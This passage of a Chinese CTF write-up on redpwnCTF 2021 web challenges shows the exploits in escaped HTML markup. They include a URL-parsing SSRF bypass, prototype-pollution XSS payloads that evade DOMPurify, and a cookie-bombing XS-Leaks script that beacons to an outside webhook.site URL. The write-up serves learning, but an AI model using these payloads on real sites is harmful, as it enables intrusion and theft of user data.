style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">endswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;}&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">alphabet&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;^&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;.*&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test_regex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;found &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> -&amp;gt; &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#d88200">}{&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>也可以拿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&lt;/p>
&lt;p>————最悲催的莫过于之后我也用docker在本地起了一个环境 但是初始化有问题，导致localhost:5984无法访问&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210720093017634.png" alt="image-20210720093017634">&lt;/p>
&lt;p>我搜了一下 有相关问题的解答 但都不明确……&lt;/p>
&lt;p>从这个报错看 应该是说题目相关的需要的database_does_not_exist，但是用于初始化的/_utils也无法访问，直接&lt;code>curl 127.0.0.1:5984&lt;/code>也是失败，&lt;code>curl couchdb:5984&lt;/code>也是失败，处理报错真是心累&lt;/p>
&lt;h2 id="webrequester-strikes-back">web/requester-strikes-back&lt;/h2>
&lt;blockquote>
&lt;p>Java was found to not be the future. Can you take down requester again?&lt;/p>
&lt;/blockquote>
&lt;p>源码处有一处修改&lt;code>if (urlURI.getHost().toLowerCase().contains(&amp;quot;couchdb&amp;quot;))&lt;/code>&lt;/p>
&lt;p>这使得我们不能用之前的Couchdb大写的方式来绕过，但是&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155508706.png" alt="image-20210806155508706">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155558838.png" alt="image-20210806155558838">&lt;/p>
&lt;p>结合&lt;a href="https://mail-archives.apache.org/mod_mbox/hc-commits/202009.mbox/%3C20200930085030.C135C82908@gitbox.apache.org%3E">Incorrect handling of malformed authority component by URIUtils#extractHost&lt;/a>&lt;/p>
&lt;p>我们只需要把之前的url改成&lt;code>http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find&lt;/code>即可（解法二）&lt;/p>
&lt;p>解法一直接跑就行 一样能通&lt;/p>
&lt;p>相关的一些ssrf前置知识&amp;amp;url解析问题仍然可以看这里：&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai&lt;/a>（好厉害的ppt）&lt;/p>
&lt;p>参考：&lt;a href="https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/#requester-strikes-back">wp1&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester-strikes-back">wp2&lt;/a>&lt;/p>
&lt;h2 id="webpastebin-1">web/pastebin-1&lt;/h2>
&lt;blockquote>
&lt;p>Ah, the classic pastebin.&lt;/p>
&lt;p>&lt;a href="https://pastebin-1.mc.ax/">pastebin-1.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://admin-bot.mc.ax/pastebin-1">Admin bot&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/4313574d2348012d122d849530c4f18340644d88ea04f0cbb4932bd35efde1da/main.rs">main.rs&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>pastebin，类似留言板的样子 可以发表paste&lt;/p>
&lt;p>第一反应就是xss，试一下alert(1) 成功弹窗&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093018218.png" alt="image-20210710093018218">&lt;/p>
&lt;p>题目另外提供了一个/admin-bot页面，&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093113748.png" alt="image-20210710093113748">&lt;/p>
&lt;p>这个，妥妥的xss好吧 直接xss platform一把梭！&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094254880.png" alt="image-20210710094254880">&lt;/p>
&lt;h2 id="webpastebin-2-social-edition">***web/pastebin-2-social-edition&lt;/h2>
&lt;blockquote>
&lt;p>Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.&lt;/p>
&lt;p>&lt;a href="https://pastebin-2-social-edition.mc.ax/">pastebin-2-social-edition.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://admin-bot.mc.ax/pastebin-2-social-edition">Admin bot&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>这次adminbot会给自己的paste下面留言回复&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/8Vc6Cyf.png" alt="8Vc6Cyf.png">&lt;/p>
&lt;p>显然啊 还是xss，但是用了DOMPurify，并且这个版本也很新 之前的一些bug也没法利用，&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#pastebin-2-social-edition">参考wp&lt;/a>&lt;/p>
&lt;p>看源码&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806171955901.png" alt="image-20210806171955901">&lt;/p>
&lt;p>注意到这里，如果有错误 就会设置&lt;code>errorContainer.innerHTML = message;&lt;/code>，如果我们能控制error message 就能做到xss了；这里利用原型污染prototype pollution，即使DOMPurify可以阻挡一些xss常用的标签或者属性，也阻止不了原型污染&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们可以把error污染成任意值，message污染为xss内容和payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">{}[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">{}[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>当请求被触发时，error和message就都是我们自定的值了；虽然DOMPurify会对&lt;code>__proto__&lt;/code>进行移除，但是因为上面&lt;code>const fieldsetName = decodeURIComponent(fieldset.name);&lt;/code>，所以再对&lt;code>__proto__&lt;/code>来一手urlencode就能绕过了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;%255F_proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webpastebin-3">***web/pastebin-3&lt;/h2>
&lt;blockquote>
&lt;p>Boy, there sure are a lot of pastebins. Gotta think of new themes&amp;hellip;&lt;/p>
&lt;p>&lt;em>Please put a reasonably secure password when making an account&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>还是一个很简单的页面 create paste，增加了一个搜索的功能&lt;/p>
&lt;p>先看/view路由&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142853227.png" alt="image-20210808142853227">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141859178.png" alt="image-20210808141859178">&lt;/p>
&lt;p>我们的便签 总体会以一个url的形式放入iframe中，接着去看看sanbox_url的渲染情况&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141709394.png" alt="image-20210808141709394">&lt;/p>
&lt;p>而亮点是，我们的paste又被直接放入反引号中间了，如果我们用类似&lt;code>${alert(1)}&lt;/code>的东西直接就可以跑js了！&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142359209.png" alt="image-20210808142359209">&lt;/p>
&lt;p>现在我们有了可以操作js代码的地方——但是这是在sandbox中，与主页面并不是同源的🤔&lt;/p>
&lt;p>再看看新加入的search功能&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808143003626.png" alt="image-20210808143003626">&lt;/p>
&lt;p>————这里要先插播一条知识了 &lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a>（更多的相关参考链接放到后面了），一个常见的xsleak攻击详见&lt;a href="https://xsleaks.dev/docs/attacks/error-events/">error events&lt;/a>&lt;/p>
&lt;p>&lt;em>Cross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web’s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. ——from XSLeaks wiki&lt;/em>&lt;/p>
&lt;p>/search使用的是flask中的flash()消息闪现来展示搜索的结果，它会存储在session cookie中，如果消息比会话cookie大的话会导致消息闪现静默失败——我们利用这一条特性，用长长的cookie，如果请求成功 那么需要显示flash时cookie将会超过限制报错，而请求失败 就只有No results found短短的一条，不会报400&lt;/p>
&lt;p>我们用XSLeaks wiki上给出的 probeError snippet&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">script&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Onload event triggered&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Error event triggered&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>虽然同站的cookies（same-site cookies）通常会阻止这种情况，但由于题中的sandbox是子域，并不是同站的情况，所以probeError可以检测到，下面是脚本&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">alphabet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`a=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">90&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`b=&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">repeat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4096&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">90&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unset&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`a=; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`b=; domain=.pastebin-3.mc.ax`&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">script&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">head&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">appendChild&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">wait&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resolve&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{c00k13_b0mb1n6_15_f4k3_vu&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">navigator&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendBeacon&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
